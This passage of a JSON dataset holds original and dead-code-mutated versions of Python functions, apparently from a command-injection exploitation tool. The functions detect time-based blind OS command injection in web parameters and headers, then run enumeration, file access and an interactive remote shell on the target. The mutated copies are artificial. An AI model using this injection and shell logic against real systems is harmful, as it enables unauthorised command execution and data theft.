payload)\n                                elif settings.HOST_INJECTION == True:\n                                    vuln_parameter = parameters.specify_host_parameter(menu.options.host)\n                                    how_long = tb_injector.host_injection_test(url, vuln_parameter, payload)\n                                elif settings.CUSTOM_HEADER_INJECTION == True:\n                                    vuln_parameter = parameters.specify_custom_header_parameter(settings.INJECT_TAG)\n                                    how_long = tb_injector.custom_header_injection_test(url, vuln_parameter, payload)\n                                else:\n                                    (how_long, vuln_parameter) = tb_injector.injection_test(payload, http_request_method, url)\n                                how_long_statistic.append(how_long)\n                                percent = num_of_chars * 100 / total\n                                float_percent = '{0:.1f}'.format(round(num_of_chars * 100 / (total * 1.0), 2))\n                                if percent == 100 and no_result == True:\n                                    if settings.VERBOSITY_LEVEL == 0:\n                                        percent = settings.FAIL_STATUS\n                                    else:\n                                        percent = ''\n                                elif url_time_response == 0 and how_long - timesec >= 0 or (url_time_response != 0 and how_long - timesec == 0 and (how_long == timesec)) or (url_time_response != 0 and how_long - timesec > 0 and (how_long >= timesec + 1)):\n                                    false_positive_fixation = False\n                                    if len(TAG) == output_length:\n                                        statistical_anomaly = True\n                                        if len(set(how_long_statistic[0:5])) == 1:\n                                            if max(xrange(len(how_long_statistic)), key=lambda x: how_long_statistic[x]) == len(TAG) - 1:\n                                                statistical_anomaly = False\n                                                how_long_statistic = []\n                                        if timesec <= how_long and (not statistical_anomaly):\n                                            false_positive_fixation = True\n                                        else:\n                                            false_positive_warning = True\n                                    if false_positive_warning:\n                                        message = 'Unexpected time delays have been identified due to unstable '\n                                        message += 'requests. This behavior may lead to false positive results. '\n                                        sys.stdout.write('\\r')\n                                        while True:\n                                            message = message + 'How do you want to proceed? [(C)ontinue/(s)kip/(q)uit] > '\n                                            proceed_option = common.read_input(message, default='C', check_batch=True)\n                                            if proceed_option.lower() in settings.CHOICE_PROCEED:\n                                                if proceed_option.lower() == 's':\n                                                    false_positive_fixation = False\n                                                    raise\n                                                elif proceed_option.lower() == 'c':\n                                                    timesec = timesec + 1\n                                                    false_positive_fixation = True\n                                                    break\n                                                elif proceed_option.lower() == 'q':\n                                                    raise SystemExit()\n                                            else:\n                                                common.invalid_option(proceed_option)\n                                                pass\n                                    if settings.VERBOSITY_LEVEL == 0:\n                                        percent = '.. (' + str(float_percent) + '%)'\n                                        info_msg = 'Testing the ' + '(' + injection_type.split(settings.SINGLE_WHITESPACE)[0] + ') ' + technique + '.' + '' + percent + ''\n                                        sys.stdout.write('\\r' + settings.print_info_msg(info_msg))\n                                        sys.stdout.flush()\n                                    if false_positive_fixation:\n                                        false_positive_fixation = False\n                                        settings.FOUND_HOW_LONG = how_long\n                                        settings.FOUND_DIFF = how_long - timesec\n                                        if false_positive_warning:\n                                            time.sleep(1)\n                                        randv1 = random.randrange(1, 10)\n                                        randv2 = random.randrange(1, 10)\n                                        randvcalc = randv1 + randv2\n                                        if settings.TARGET_OS == settings.OS.WINDOWS:\n                                            if alter_shell:\n                                                cmd = settings.WIN_PYTHON_INTERPRETER + 'python.exe -c \"print (' + str(randv1) + ' + ' + str(randv2) + ')\"'\n                                            else:\n                                                rand_num = randv1 + randv2\n                                                cmd = 'powershell.exe -InputFormat none write (' + str(rand_num) + ')'\n                                        else:\n                                            cmd = 'expr ' + str(randv1) + ' %2B ' + str(randv2) + ''\n                                        original_how_long = how_long\n                                        (how_long, output) = tb_injector.false_positive_check(separator, TAG, cmd, whitespace, prefix, suffix, timesec, http_request_method, url, vuln_parameter, randvcalc, alter_shell, how_long, url_time_response, false_positive_warning)\n                                        if url_time_response == 0 and how_long - timesec >= 0 or (url_time_response != 0 and how_long - timesec == 0 and (how_long == timesec)) or (url_time_response != 0 and how_long - timesec > 0 and (how_long >= timesec + 1)):\n                                            if str(output) == str(randvcalc) and len(TAG) == output_length:\n                                                possibly_vulnerable = True\n                                                how_long_statistic = 0\n                                                if settings.VERBOSITY_LEVEL == 0:\n                                                    percent = settings.info_msg\n                                                else:\n                                                    percent = ''\n                                        else:\n                                            break\n                                    else:\n                                        if settings.VERBOSITY_LEVEL == 0:\n                                            percent = '.. (' + str(float_percent) + '%)'\n                                            info_msg = 'Testing the ' + '(' + injection_type.split(settings.SINGLE_WHITESPACE)[0] + ') ' + technique + '.' + '' + percent + ''\n                                            sys.stdout.write('\\r' + settings.print_info_msg(info_msg))\n                                            sys.stdout.flush()\n                                        continue\n                                else:\n                                    if settings.VERBOSITY_LEVEL == 0:\n                                        percent = '.. (' + str(float_percent) + '%)'\n                                        info_msg = 'Testing the ' + '(' + injection_type.split(settings.SINGLE_WHITESPACE)[0] + ') ' + technique + '.' + '' + percent + ''\n                                        sys.stdout.write('\\r' + settings.print_info_msg(info_msg))\n                                        sys.stdout.flush()\n                                    continue\n                            except (KeyboardInterrupt, SystemExit):\n                                print(settings.SINGLE_WHITESPACE)\n                                raise\n                            except EOFError:\n                                if settings.STDIN_PARSING:\n                                    print(settings.SINGLE_WHITESPACE)\n                                err_msg = 'Exiting, due to EOFError.'\n                                print(settings.print_error_msg(err_msg))\n                                raise\n                            except:\n                                percent = num_of_chars * 100 / total\n                                float_percent = '{0:.1f}'.format(round(num_of_chars * 100 / (total * 1.0), 2))\n                                if str(float_percent) == '100.0':\n                                    if no_result == True:\n                                        if settings.VERBOSITY_LEVEL == 0:\n                                            percent = settings.FAIL_STATUS\n                                            info_msg = 'Testing the ' + '(' + injection_type.split(settings.SINGLE_WHITESPACE)[0] + ') ' + technique + '.' + '' + percent + ''\n                                            sys.stdout.write('\\r' + settings.print_info_msg(info_msg))\n                                            sys.stdout.flush()\n                                        else:\n                                            percent = ''\n                                    else:\n                                        percent = '.. (' + str(float_percent) + '%)'\n                                        print(settings.SINGLE_WHITESPACE)\n                                        logs.logs_notification(filename)\n                                else:\n                                    percent = '.. (' + str(float_percent) + '%)'\n                            break\n                    if url_time_response == 0 and how_long - timesec >= 0 or (url_time_response != 0 and how_long - timesec == 0 and (how_long == timesec)) or (url_time_response != 0 and how_long - timesec > 0 and (how_long >= timesec + 1)):\n                        if len(TAG) == output_length and (possibly_vulnerable == True or (settings.LOAD_SESSION and int(is_vulnerable) == menu.options.level)):\n                            found = True\n                            no_result = False\n                            settings.DETECTION_PHASE = False\n                            settings.EXPLOITATION_PHASE = True\n                            if settings.LOAD_SESSION:\n                                possibly_vulnerable = False\n                            if settings.COOKIE_INJECTION == True:\n                                header_name = ' cookie'\n                                found_vuln_parameter = vuln_parameter\n                                the_type = ' parameter'\n                            elif settings.USER_AGENT_INJECTION == True:\n                                header_name = ' User-Agent'\n                                found_vuln_parameter = ''\n                                the_type = ' HTTP header'\n                            elif settings.REFERER_INJECTION == True:\n                                header_name = ' Referer'\n                                found_vuln_parameter = ''\n                                the_type = ' HTTP header'\n                            elif settings.CUSTOM_HEADER_INJECTION == True:\n                                header_name = settings.SINGLE_WHITESPACE + settings.CUSTOM_HEADER_NAME\n                                found_vuln_parameter = ''\n                                the_type = ' HTTP header'\n                            else:\n                                header_name = ''\n                                the_type = ' parameter'\n                                if not settings.USER_DEFINED_POST_DATA:\n                                    found_vuln_parameter = parameters.vuln_GET_param(url)\n                                else:\n                                    found_vuln_parameter = vuln_parameter\n                            if len(found_vuln_parameter) != 0:\n                                found_vuln_parameter = \" '\" + found_vuln_parameter + Style.RESET_ALL + Style.BRIGHT + \"'\"\n                            if export_injection_info == False:\n                                export_injection_info = logs.add_type_and_technique(export_injection_info, filename, injection_type, technique)\n                            if vp_flag == True:\n                                vp_flag = logs.add_parameter(vp_flag, filename, the_type, header_name, http_request_method, vuln_parameter, payload)\n                            logs.update_payload(filename, counter, payload)\n                            counter = counter + 1\n                            if not settings.LOAD_SESSION:\n                                if settings.VERBOSITY_LEVEL == 0:\n                                    print(settings.SINGLE_WHITESPACE)\n                                else:\n                                    checks.total_of_requests()\n                            info_msg = settings.CHECKING_PARAMETER + ' appears to be injectable via '\n                            info_msg += '(' + injection_type.split(settings.SINGLE_WHITESPACE)[0] + ') ' + technique + '.'\n                            print(settings.print_bold_info_msg(info_msg))\n                            sub_content = str(checks.url_decode(payload))\n                            print(settings.print_sub_content(sub_content))\n                            if not settings.LOAD_SESSION:\n                                shell = ''\n                                session_handler.injection_point_importation(url, technique, injection_type, separator, shell, vuln_parameter, prefix, suffix, TAG, alter_shell, payload, http_request_method, url_time_response, timesec, original_how_long, output_length, is_vulnerable=menu.options.level)\n                            else:\n                                whitespace = settings.WHITESPACES[0]\n                                settings.LOAD_SESSION = False\n                            if settings.ENUMERATION_DONE == True:\n                                while True:\n                                    message = 'Do you want to ignore stored session and enumerate again? [y/N] > '\n                                    enumerate_again = common.read_input(message, default='N', check_batch=True)\n                                    if enumerate_again in settings.CHOICE_YES:\n                                        if not menu.options.ignore_session:\n                                            menu.options.ignore_session = True\n                                        tb_enumeration.do_check(separator, maxlen, TAG, cmd, prefix, suffix, whitespace, timesec, http_request_method, url, vuln_parameter, alter_shell, filename, url_time_response)\n                                        break\n                                    elif enumerate_again in settings.CHOICE_NO:\n                                        break\n                                    elif enumerate_again in settings.CHOICE_QUIT:\n                                        raise SystemExit()\n                                    else:\n                                        common.invalid_option(enumerate_again)\n                                        pass\n                            elif menu.enumeration_options():\n                                tb_enumeration.do_check(separator, maxlen, TAG, cmd, prefix, suffix, whitespace, timesec, http_request_method, url, vuln_parameter, alter_shell, filename, url_time_response)\n                            if settings.FILE_ACCESS_DONE == True:\n                                while True:\n                                    message = 'Do you want to ignore stored session and access files again? [y/N] > '\n                                    file_access_again = common.read_input(message, default='N', check_batch=True)\n                                    if file_access_again in settings.CHOICE_YES:\n                                        if not menu.options.ignore_session:\n                                            menu.options.ignore_session = True\n                                        tb_file_access.do_check(separator, maxlen, TAG, cmd, prefix, suffix, whitespace, timesec, http_request_method, url, vuln_parameter, alter_shell, filename, url_time_response)\n                                        break\n                                    elif file_access_again in settings.CHOICE_NO:\n                                        break\n                                    elif file_access_again in settings.CHOICE_QUIT:\n                                        raise SystemExit()\n                                    else:\n                                        common.invalid_option(file_access_again)\n                                        pass\n                            elif menu.file_access_options():\n                                tb_file_access.do_check(separator, maxlen, TAG, cmd, prefix, suffix, whitespace, timesec, http_request_method, url, vuln_parameter, alter_shell, filename, url_time_response)\n                            if menu.options.os_cmd:\n                                cmd = menu.options.os_cmd\n                                (check_how_long, output) = tb_enumeration.single_os_cmd_exec(separator, maxlen, TAG, cmd, prefix, suffix, whitespace, timesec, http_request_method, url, vuln_parameter, alter_shell, filename, url_time_response)\n                            try:\n                                checks.alert()\n                                go_back = False\n                                go_back_again = False\n                                while True:\n                                    if go_back == True:\n                                        break\n                                    message = settings.CHECKING_PARAMETER + ' is vulnerable. Do you want to prompt for a pseudo-terminal shell? [Y/n] > '\n                                    if settings.CRAWLING:\n                                        settings.CRAWLED_URLS_INJECTED.append(_urllib.parse.urlparse(url).netloc)\n                                    if not settings.STDIN_PARSING:\n                                        gotshell = common.read_input(message, default='Y', check_batch=True)\n                                    else:\n                                        gotshell = common.read_input(message, default='n', check_batch=True)\n                                    if gotshell in settings.CHOICE_YES:\n                                        print(settings.OS_SHELL_TITLE)\n                                        if settings.READLINE_ERROR:\n                                            checks.no_readline_module()\n                                        while True:\n                                            if false_positive_warning:\n                                                warn_msg = 'Due to unexpected time delays, it is highly '\n                                                warn_msg += \"recommended to enable the 'reverse_tcp' option.\\n\"\n                                                sys.stdout.write('\\r' + settings.print_warning_msg(warn_msg))\n                                                false_positive_warning = False\n                                            if not settings.READLINE_ERROR:\n                                                checks.tab_autocompleter()\n                                            sys.stdout.write(settings.OS_SHELL)\n                                            cmd = common.read_input(message='', default='os_shell', check_batch=True)\n                                            cmd = checks.escaped_cmd(cmd)\n                                            if cmd.lower() in settings.SHELL_OPTIONS:\n                                                (go_back, go_back_again) = shell_options.check_option(separator, TAG, cmd, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, alter_shell, filename, technique, go_back, no_result, timesec, go_back_again, payload, OUTPUT_TEXTFILE='')\n                                                if go_back and go_back_again == False:\n                                                    break\n                                                if go_back and go_back_again:\n                                                    return True\n                                            else:\n                                                if menu.options.ignore_session or session_handler.export_stored_cmd(url, cmd, vuln_parameter) == None:\n                                                    (check_how_long, output) = tb_injector.injection(separator, maxlen, TAG, cmd, prefix, suffix, whitespace, timesec, http_request_method, url, vuln_parameter, alter_shell, filename, url_time_response)\n                                                    tb_injector.export_injection_results(cmd, separator, output, check_how_long)\n                                                    if not menu.options.ignore_session:\n                                                        session_handler.store_cmd(url, cmd, output, vuln_parameter)\n                                                else:\n                                                    output = session_handler.export_stored_cmd(url, cmd, vuln_parameter)\n                                                    print(settings.print_output(output))\n                                                logs.executed_command(filename, cmd, output)\n                                    elif gotshell in settings.CHOICE_NO:\n                                        if checks.next_attack_vector(technique, go_back) == True:\n                                            break\n                                        elif no_result == True:\n                                            return False\n                                        else:\n                                            return True\n                                    elif gotshell in settings.CHOICE_QUIT:\n                                        raise SystemExit()\n                                    else:\n                                        common.invalid_option(gotshell)\n                                        pass\n                            except (KeyboardInterrupt, SystemExit):\n                                raise\n                            except EOFError:\n                                if settings.STDIN_PARSING:\n                                    print(settings.SINGLE_WHITESPACE)\n                                err_msg = 'Exiting, due to EOFError.'\n                                print(settings.print_error_msg(err_msg))\n                                raise\n    if no_result == True:\n        if settings.VERBOSITY_LEVEL == 0:\n            print(settings.SINGLE_WHITESPACE)\n        return False\n    else:\n        sys.stdout.write('\\r')\n        sys.stdout.flush()"
        ]
    },
    {
        "func_name": "exploitation",
        "original": "def exploitation(url, timesec, filename, http_request_method, url_time_response, injection_type, technique):\n    if not settings.TIME_RELATIVE_ATTACK:\n        warn_msg = 'It is very important to not stress the network connection during usage of time-based payloads to prevent potential disruptions.'\n        print(settings.print_warning_msg(warn_msg) + Style.RESET_ALL)\n        settings.TIME_RELATIVE_ATTACK = True\n    if url_time_response >= settings.SLOW_TARGET_RESPONSE:\n        warn_msg = 'It is highly recommended, due to serious response delays, '\n        warn_msg += 'to skip the time-based (blind) technique and to continue '\n        warn_msg += 'with the file-based (semiblind) technique.'\n        print(settings.print_warning_msg(warn_msg))\n        go_back = False\n        while True:\n            if go_back == True:\n                return False\n            message = 'How do you want to proceed? [(C)ontinue/(s)kip/(q)uit] > '\n            proceed_option = common.read_input(message, default='C', check_batch=True)\n            if proceed_option.lower() in settings.CHOICE_PROCEED:\n                if proceed_option.lower() == 's':\n                    from src.core.injections.semiblind.techniques.file_based import fb_handler\n                    fb_handler.exploitation(url, timesec, filename, http_request_method, url_time_response, injection_type, technique)\n                elif proceed_option.lower() == 'c':\n                    if tb_injection_handler(url, timesec, filename, http_request_method, url_time_response, injection_type, technique) == False:\n                        return False\n                elif proceed_option.lower() == 'q':\n                    raise SystemExit()\n            else:\n                common.invalid_option(proceed_option)\n                pass\n    elif tb_injection_handler(url, timesec, filename, http_request_method, url_time_response, injection_type, technique) == False:\n        settings.TIME_RELATIVE_ATTACK = False\n        return False",
        "mutated": [
            "def exploitation(url, timesec, filename, http_request_method, url_time_response, injection_type, technique):\n    if False:\n        i = 10\n    if not settings.TIME_RELATIVE_ATTACK:\n        warn_msg = 'It is very important to not stress the network connection during usage of time-based payloads to prevent potential disruptions.'\n        print(settings.print_warning_msg(warn_msg) + Style.RESET_ALL)\n        settings.TIME_RELATIVE_ATTACK = True\n    if url_time_response >= settings.SLOW_TARGET_RESPONSE:\n        warn_msg = 'It is highly recommended, due to serious response delays, '\n        warn_msg += 'to skip the time-based (blind) technique and to continue '\n        warn_msg += 'with the file-based (semiblind) technique.'\n        print(settings.print_warning_msg(warn_msg))\n        go_back = False\n        while True:\n            if go_back == True:\n                return False\n            message = 'How do you want to proceed? [(C)ontinue/(s)kip/(q)uit] > '\n            proceed_option = common.read_input(message, default='C', check_batch=True)\n            if proceed_option.lower() in settings.CHOICE_PROCEED:\n                if proceed_option.lower() == 's':\n                    from src.core.injections.semiblind.techniques.file_based import fb_handler\n                    fb_handler.exploitation(url, timesec, filename, http_request_method, url_time_response, injection_type, technique)\n                elif proceed_option.lower() == 'c':\n                    if tb_injection_handler(url, timesec, filename, http_request_method, url_time_response, injection_type, technique) == False:\n                        return False\n                elif proceed_option.lower() == 'q':\n                    raise SystemExit()\n            else:\n                common.invalid_option(proceed_option)\n                pass\n    elif tb_injection_handler(url, timesec, filename, http_request_method, url_time_response, injection_type, technique) == False:\n        settings.TIME_RELATIVE_ATTACK = False\n        return False",
            "def exploitation(url, timesec, filename, http_request_method, url_time_response, injection_type, technique):\n    if False:\n        i = 10\n        while True:\n            print('Mutation')\n    if not settings.TIME_RELATIVE_ATTACK:\n        warn_msg = 'It is very important to not stress the network connection during usage of time-based payloads to prevent potential disruptions.'\n        print(settings.print_warning_msg(warn_msg) + Style.RESET_ALL)\n        settings.TIME_RELATIVE_ATTACK = True\n    if url_time_response >= settings.SLOW_TARGET_RESPONSE:\n        warn_msg = 'It is highly recommended, due to serious response delays, '\n        warn_msg += 'to skip the time-based (blind) technique and to continue '\n        warn_msg += 'with the file-based (semiblind) technique.'\n        print(settings.print_warning_msg(warn_msg))\n        go_back = False\n        while True:\n            if go_back == True:\n                return False\n            message = 'How do you want to proceed? [(C)ontinue/(s)kip/(q)uit] > '\n            proceed_option = common.read_input(message, default='C', check_batch=True)\n            if proceed_option.lower() in settings.CHOICE_PROCEED:\n                if proceed_option.lower() == 's':\n                    from src.core.injections.semiblind.techniques.file_based import fb_handler\n                    fb_handler.exploitation(url, timesec, filename, http_request_method, url_time_response, injection_type, technique)\n                elif proceed_option.lower() == 'c':\n                    if tb_injection_handler(url, timesec, filename, http_request_method, url_time_response, injection_type, technique) == False:\n                        return False\n                elif proceed_option.lower() == 'q':\n                    raise SystemExit()\n            else:\n                common.invalid_option(proceed_option)\n                pass\n    elif tb_injection_handler(url, timesec, filename, http_request_method, url_time_response, injection_type, technique) == False:\n        settings.TIME_RELATIVE_ATTACK = False\n        return False",
            "def exploitation(url, timesec, filename, http_request_method, url_time_response, injection_type, technique):\n    if False:\n        i = 10\n        while True:\n            print('Mutation')\n        n = 10\n        dp = [0, 1]\n        for i in range(2, n + 1):\n            dp.append(dp[i - 1] + dp[i - 2])\n        print(dp[n])\n    if not settings.TIME_RELATIVE_ATTACK:\n        warn_msg = 'It is very important to not stress the network connection during usage of time-based payloads to prevent potential disruptions.'\n        print(settings.print_warning_msg(warn_msg) + Style.RESET_ALL)\n        settings.TIME_RELATIVE_ATTACK = True\n    if url_time_response >= settings.SLOW_TARGET_RESPONSE:\n        warn_msg = 'It is highly recommended, due to serious response delays, '\n        warn_msg += 'to skip the time-based (blind) technique and to continue '\n        warn_msg += 'with the file-based (semiblind) technique.'\n        print(settings.print_warning_msg(warn_msg))\n        go_back = False\n        while True:\n            if go_back == True:\n                return False\n            message = 'How do you want to proceed? [(C)ontinue/(s)kip/(q)uit] > '\n            proceed_option = common.read_input(message, default='C', check_batch=True)\n            if proceed_option.lower() in settings.CHOICE_PROCEED:\n                if proceed_option.lower() == 's':\n                    from src.core.injections.semiblind.techniques.file_based import fb_handler\n                    fb_handler.exploitation(url, timesec, filename, http_request_method, url_time_response, injection_type, technique)\n                elif proceed_option.lower() == 'c':\n                    if tb_injection_handler(url, timesec, filename, http_request_method, url_time_response, injection_type, technique) == False:\n                        return False\n                elif proceed_option.lower() == 'q':\n                    raise SystemExit()\n            else:\n                common.invalid_option(proceed_option)\n                pass\n    elif tb_injection_handler(url, timesec, filename, http_request_method, url_time_response, injection_type, technique) == False:\n        settings.TIME_RELATIVE_ATTACK = False\n        return False",
            "def exploitation(url, timesec, filename, http_request_method, url_time_response, injection_type, technique):\n    if False:\n        i = 10\n        while True:\n            print('Mutation')\n        n = 10\n        dp = [0, 1]\n        for i in range(2, n + 1):\n            dp.append(dp[i - 1] + dp[i - 2])\n        print(dp[n])\n\n        def dfs(node):\n            if node == None:\n                return []\n            left = dfs(node.left)\n            right = dfs(node.right)\n    if not settings.TIME_RELATIVE_ATTACK:\n        warn_msg = 'It is very important to not stress the network connection during usage of time-based payloads to prevent potential disruptions.'\n        print(settings.print_warning_msg(warn_msg) + Style.RESET_ALL)\n        settings.TIME_RELATIVE_ATTACK = True\n    if url_time_response >= settings.SLOW_TARGET_RESPONSE:\n        warn_msg = 'It is highly recommended, due to serious response delays, '\n        warn_msg += 'to skip the time-based (blind) technique and to continue '\n        warn_msg += 'with the file-based (semiblind) technique.'\n        print(settings.print_warning_msg(warn_msg))\n        go_back = False\n        while True:\n            if go_back == True:\n                return False\n            message = 'How do you want to proceed? [(C)ontinue/(s)kip/(q)uit] > '\n            proceed_option = common.read_input(message, default='C', check_batch=True)\n            if proceed_option.lower() in settings.CHOICE_PROCEED:\n                if proceed_option.lower() == 's':\n                    from src.core.injections.semiblind.techniques.file_based import fb_handler\n                    fb_handler.exploitation(url, timesec, filename, http_request_method, url_time_response, injection_type, technique)\n                elif proceed_option.lower() == 'c':\n                    if tb_injection_handler(url, timesec, filename, http_request_method, url_time_response, injection_type, technique) == False:\n                        return False\n                elif proceed_option.lower() == 'q':\n                    raise SystemExit()\n            else:\n                common.invalid_option(proceed_option)\n                pass\n    elif tb_injection_handler(url, timesec, filename, http_request_method, url_time_response, injection_type, technique) == False:\n        settings.TIME_RELATIVE_ATTACK = False\n        return False",
            "def exploitation(url, timesec, filename, http_request_method, url_time_response, injection_type, technique):\n    if False:\n        i = 10\n        while True:\n            print('Mutation')\n        dp = [0, 1]\n        for i in range(2, n + 1):\n            dp.append(dp[i - 1] + dp[i - 2])\n        print(dp[n])\n\n        def dfs(node):\n            if node == None:\n                return []\n            left = dfs(node.left)\n            right = dfs(node.right)\n        length = 15\n        if length <= 0:\n            return []\n        elif length == 1:\n            return [0]\n        sequence = [0, 1]\n        while len(sequence) < length:\n            next_value = sequence[-1] + sequence[-2]\n            sequence.append(next_value)\n        return sequence\n    if not settings.TIME_RELATIVE_ATTACK:\n        warn_msg = 'It is very important to not stress the network connection during usage of time-based payloads to prevent potential disruptions.'\n        print(settings.print_warning_msg(warn_msg) + Style.RESET_ALL)\n        settings.TIME_RELATIVE_ATTACK = True\n    if url_time_response >= settings.SLOW_TARGET_RESPONSE:\n        warn_msg = 'It is highly recommended, due to serious response delays, '\n        warn_msg += 'to skip the time-based (blind) technique and to continue '\n        warn_msg += 'with the file-based (semiblind) technique.'\n        print(settings.print_warning_msg(warn_msg))\n        go_back = False\n        while True:\n            if go_back == True:\n                return False\n            message = 'How do you want to proceed? [(C)ontinue/(s)kip/(q)uit] > '\n            proceed_option = common.read_input(message, default='C', check_batch=True)\n            if proceed_option.lower() in settings.CHOICE_PROCEED:\n                if proceed_option.lower() == 's':\n                    from src.core.injections.semiblind.techniques.file_based import fb_handler\n                    fb_handler.exploitation(url, timesec, filename, http_request_method, url_time_response, injection_type, technique)\n                elif proceed_option.lower() == 'c':\n                    if tb_injection_handler(url, timesec, filename, http_request_method, url_time_response, injection_type, technique) == False:\n                        return False\n                elif proceed_option.lower() == 'q':\n                    raise SystemExit()\n            else:\n                common.invalid_option(proceed_option)\n                pass\n    elif tb_injection_handler(url, timesec, filename, http_request_method, url_time_response, injection_type, technique) == False:\n        settings.TIME_RELATIVE_ATTACK = False\n        return False"
        ]
    }
]